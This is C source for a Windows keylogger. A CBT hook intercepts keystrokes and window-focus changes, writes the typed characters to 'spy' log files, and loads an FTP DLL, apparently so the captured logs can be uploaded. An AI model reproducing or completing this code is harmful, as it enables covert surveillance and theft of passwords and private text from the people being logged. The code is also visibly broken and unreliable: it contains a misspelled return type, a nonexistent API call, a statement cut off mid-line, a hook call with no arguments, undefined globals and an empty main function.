#include <windows.h>

LPRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	if (msg == MSG_MY_WM_KEYDOWN)
		return OnInterceptKeyStroke(wParam, lParam);
	if (msg == MSG_MY_WM_SETFOCUS)
		return OnSetKeyboardFocus(wParam, lParam);
	if (msg == MSG_WM_UPLOAD_FILE)
		return OnFileUpload(wParam, lParam);
	if (msg == WM_DESTROY)
		PostQuitMessage(0);
	else
		return DefWindowProc(hWnd, msg, wParam, lParam);
	return NULL;
}

LRESULT OnInterceptKeyStroke(WPARAM wParam, LPARAM lParam)
{
	if (g_hWinInFocus != g_hLastWin)
	{
		WriteNewAppHeader(g_hWinInFocus);
		g_hLastWin = g_hWinInFocus;
	}

	if (wParam == VK_RETURN || wParam == VK_TAB)
	{
		WriteToLog(' \n');
	} else
	{
		BYTE keyStateArr[256];
		WORD word;
		UINT scanCode = lParam;
		char ch;
		GetKeyboardState(keyStateArr);
		ToAscii(wParam, scanCode, keyStateArr, &word, 0);
		ch = (char)word;

		if ((GetKeyState(VK_SHIFT) & 0x8000) && wParam >= 'a' && 
			wParam <= 'z')
			ch += 'A' - 'a';
		WriteToLog(ch);
	}
	return 0;
}

LRESULT OnSetKeyboardFocus(WPARAM wParam, LPARAM lParam)
{
	g_hWinInFocus = (HWND)wParam;
	return S_OK;
}


LRESULT OnFileUpload(WPARAM wParam, LPARAM lParam)
{
	if (wParam)
	{
		DeleteFile(g_sSpyLogFileName2);
	} else
	{
		char temp[256];
		FILE* f1 = fopen(g_sSpyLogFileName1, "rb");
		FILE* f2 = fopen(g_sSpyLogFileName2, "ab");
		while (!feof(f1))
		{
			if (fgets(temp, 255, f1))
			{
				fputs(temp, f2);
			}
		}
		fclose(f1);
		fclose(f2);
		MoveFile(g_sSpyLogFileName2, g_sSpyLogFileName1);
	}
	g_isUploading = false;
	return S_OK;
}

#pragma data_seg(".shared")
HWND g_hSpyWin = NULL;
#pragma data_seg()
#pragma comment(linker, "/SECTION:shared,RWS")

void CALLBACK SetSpyHwnd(DWORD hwnd)
{
	g_hSpyWin = (HWND)hwnd;
}

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HCBT_KEYSKIPPED && (lParam & 0x40000000))
	{
		if ((wParam==VK_SPACE)||(wParam == VK_RETURN)
			|| (wParam == VK_TAB) || (wParam>=0x2f) && (wParam<=0x100))
		{
			PostMessageBox(g_hSpyWin, MSG_MY_WM_KEYDOWN, wParam, lParam);
		} 
	}
	else if (nCode == HCBT_SETFOCUS)
	{
		PostMessage(g_hSpyWin, MSG_MY_WM_SETFOCUS, wParam, lParam);
		if (bInjectFtpDll && FindWindow(COMM_WIN_CLASS, NULL) == NULL)
		{
			HINSTANCE hFtpDll;
			Init InitFunc;
			if (hFtpDll = LoadLibrary(FTP_DLL_NAME))
			{
				InitFunc
			}
		}
	}
	return CallNextHookEx();
}


int main()
{
	return 0;
}